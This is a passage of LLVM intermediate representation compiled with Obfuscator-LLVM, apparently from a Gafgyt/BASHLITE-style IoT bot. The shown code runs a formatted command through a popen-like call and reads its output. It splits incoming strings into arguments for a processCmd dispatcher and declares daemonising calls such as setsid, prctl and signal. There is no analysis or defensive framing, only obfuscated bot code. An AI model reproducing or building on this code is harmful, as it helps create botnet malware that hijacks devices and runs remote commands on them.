  %139 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %138, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i64 0, i64 0), i8* %122)
  %140 = call i32 @fdpopen(i8* nonnull %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i64 0, i64 0))
  %141 = call i8* @fdgets(i8* nonnull %138, i32 1024, i32 %140)
  %142 = icmp eq i8* %141, null
  br i1 %142, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %137
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %138)
  call void @llvm.memset.p0i8.i64(i8* nonnull %138, i8 0, i64 1024, i32 16, i1 false)
  %143 = call i32 @sleep(i32 1) #3
  %144 = call i8* @fdgets(i8* nonnull %138, i32 1024, i32 %140)
  %145 = icmp eq i8* %144, null
  br i1 %145, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %137
  %146 = call i32 @fdpclose(i32 %140)
  call void @exit(i32 0) #17
  unreachable

; <label>:147:                                    ; preds = %._crit_edge104
  %148 = call i8* @strtok(i8* %122, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i64 0, i64 0)) #3
  store i8* %111, i8** %32, align 16
  %149 = icmp eq i8* %148, null
  br i1 %149, label %._crit_edge109.thread, label %.lr.ph108.preheader

.lr.ph108.preheader:                              ; preds = %147
  br label %.lr.ph108

._crit_edge109.thread:                            ; preds = %147
  call void @processCmd(i32 1, i8** nonnull %32)
  br label %.backedge

.lr.ph108:                                        ; preds = %.lr.ph108.preheader, %162
  %.064106 = phi i8* [ %163, %162 ], [ %148, %.lr.ph108.preheader ]
  %.065105 = phi i32 [ %.1, %162 ], [ 1, %.lr.ph108.preheader ]
  %150 = load i8, i8* %.064106, align 1
  %151 = icmp eq i8 %150, 10
  br i1 %151, label %162, label %152

; <label>:152:                                    ; preds = %.lr.ph108
  %153 = call i64 @strlen(i8* nonnull %.064106) #15
  %154 = add i64 %153, 1
  %155 = call noalias i8* @malloc(i64 %154) #3
  %156 = sext i32 %.065105 to i64
  %157 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %156
  store i8* %155, i8** %157, align 8
  %158 = call i64 @strlen(i8* nonnull %.064106) #15
  %159 = add i64 %158, 1
  call void @llvm.memset.p0i8.i64(i8* %155, i8 0, i64 %159, i32 1, i1 false)
  %160 = call i8* @strcpy(i8* %155, i8* nonnull %.064106) #3
  %161 = add nsw i32 %.065105, 1
  br label %162

; <label>:162:                                    ; preds = %.lr.ph108, %152
  %.1 = phi i32 [ %161, %152 ], [ %.065105, %.lr.ph108 ]
  %163 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i64 0, i64 0)) #3
  %164 = icmp eq i8* %163, null
  br i1 %164, label %._crit_edge109, label %.lr.ph108

._crit_edge109:                                   ; preds = %162
  call void @processCmd(i32 %.1, i8** nonnull %32)
  %165 = icmp sgt i32 %.1, 1
  br i1 %165, label %.lr.ph112.preheader, label %.backedge

.lr.ph112.preheader:                              ; preds = %._crit_edge109
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph112

.lr.ph112:                                        ; preds = %.lr.ph112.preheader, %.lr.ph112
  %indvars.iv120 = phi i64 [ %indvars.iv.next121, %.lr.ph112 ], [ 1, %.lr.ph112.preheader ]
  %166 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv120
  %167 = load i8*, i8** %166, align 8
  call void @free(i8* %167) #3
  %indvars.iv.next121 = add nuw nsw i64 %indvars.iv120, 1
  %exitcond = icmp eq i64 %indvars.iv.next121, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph112
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146616014}
!2 = !{i32 -2146614574}
!3 = !{i32 -2146613751}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146612931}
!7 = !{i32 -2146611527}
!8 = !{i32 -2146610665}
!9 = !{i32 -2146609944}
